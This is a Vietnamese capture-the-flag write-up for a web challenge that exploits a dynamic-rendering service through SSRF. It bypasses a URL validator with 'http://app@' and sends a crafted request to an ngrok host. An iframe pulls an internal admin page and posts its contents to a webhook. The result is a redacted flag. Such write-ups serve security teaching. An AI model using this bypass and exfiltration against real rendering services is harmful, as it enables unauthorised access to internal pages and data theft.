# Solution

Ở bài này tận dụng cách khai thác đối với dynamic rendering + SSRF.


Đoạn code `server.js`

```js
const validateUrls = (req, res, next) => {

    let matches = url.parse(req.prerender.url).href.match(/^(http:\/\/|https:\/\/)app/gi)
    if (!matches) {
        return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');
    }

    next();
}
```
thực hiện validate host phải bắt đầu bằng `http://app` hoặc `https://app` => bypass với `http://app@`

Kĩ thuật để khai thác thì trong [bài viết](https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/) này đã nêu rõ nên mình sẽ không trình bày lại.

Gửi request

```
GET /redirect.html HTTP/1.1
Host: app@3c58-2402-800-63b7-e478-8d1d-9907-e0c6-5c37.ngrok.io
User-Agent: googlebot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

Sau khi đọc kĩ mình nhận ra không cần thiết (ít nhất là trong bài này) phải gửi request đến `localhost:3000/render?` tận 2 lần. 

Tạo một iframe ở `redirect.html` với `src=http://localhost:3000/render?url=http://app/login.php` và POST nội dung của iframe này đến WEB HOOK.

Kết quả:

```
		<div>
			<p> Welcome back, admin! </p><p>
			</p><p> Here's your cereal. </p>
			<img src="images/cereal.jpg" alt="Cereal" width="200" height="200">
			<p> And your flag: SEE{REDACTED} </p>
		</div>
```

# Tài liệu tham khảo:
<https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/>


